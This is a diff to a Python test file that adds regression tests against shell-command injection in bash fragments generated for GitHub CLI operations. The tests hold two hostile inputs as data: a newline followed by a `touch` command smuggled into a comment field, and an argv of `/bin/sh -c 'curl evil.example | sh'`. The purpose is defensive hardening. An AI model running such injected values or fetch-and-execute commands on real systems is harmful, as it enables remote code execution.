@@ -1028,8 +1028,6 @@ def test_declared_default_stays_silent_where_explicit_would_shout(bf, axis_label
 # are exactly the class a string assertion agrees with and a shell disagrees
 # with.
 
-import subprocess
-
 
 def _run_fragment(tmp_path, fragment: str) -> None:
     """Execute an emitted fragment with a `gh` that always fails (guard path)."""
@@ -1177,3 +1175,57 @@ def test_no_intents_and_no_errors_stays_quiet(bf, capsys):
     out = capsys.readouterr()
     assert "No back-fill intents declared" in out.out
     assert out.err == ""
+
+
+def test_newline_in_blocked_reason_cannot_escape_its_comment(apply_mod, tmp_path):
+    """The sibling sink the first sanitiser fix did not reach.
+
+    `blocked_reason` renders into a bash comment exactly as `citation` does, and
+    is hydrated verbatim from a supplied plan document on the `--plan` path. The
+    fix for one field is not a fix for the other; a field-by-field sanitiser
+    needs a test per field, which is what this is.
+    """
+    marker = tmp_path / "PWNED_blocked_reason"
+    change = apply_mod.PlannedChange(
+        issue_number=7,
+        kind="assign-milestone",
+        argv=None,
+        citation="x",
+        target="M1",
+        observed=None,
+        blocked_reason=f"board membership missing\ntouch {marker}  #",
+    )
+    _run_fragment(tmp_path, apply_mod._emit_one(change))
+    assert not marker.exists(), "a newline in blocked_reason opened an executable line"
+
+
+def test_every_comment_rendered_field_is_flattened(apply_mod):
+    """Structural, so the next field added to a comment is not missed.
+
+    Both known sinks go through the flattener; asserting the property rather than
+    the two instances is what stops a third field repeating this.
+    """
+    for payload in ("a\nb", "a\rb", "a\r\nb"):
+        assert "\n" not in apply_mod._comment_safe(payload)
+        assert "\r" not in apply_mod._comment_safe(payload)
+
+
+def test_plan_parsing_drops_a_foreign_executable(apply_mod):
+    """argv[0] is the program; per-token quoting does not constrain it.
+
+    This engine constructs only `gh` invocations, so a plan carrying anything
+    else did not come from here. Pinned at the same boundary that already
+    filters `kind` and `axis`.
+    """
+    plan = {
+        "schema_version": apply_mod.CONSUMED_PLAN_SCHEMA_VERSION,
+        "intents": [{"kind": "assign-milestone", "target": "M1"}],
+        "proposed": [
+            {
+                "issue_number": 7,
+                "kind": "assign-milestone",
+                "argv": ["/bin/sh", "-c", "curl evil.example | sh"],
+            }
+        ],
+    }
+    assert apply_mod.planned_changes_from_plan(plan) == []
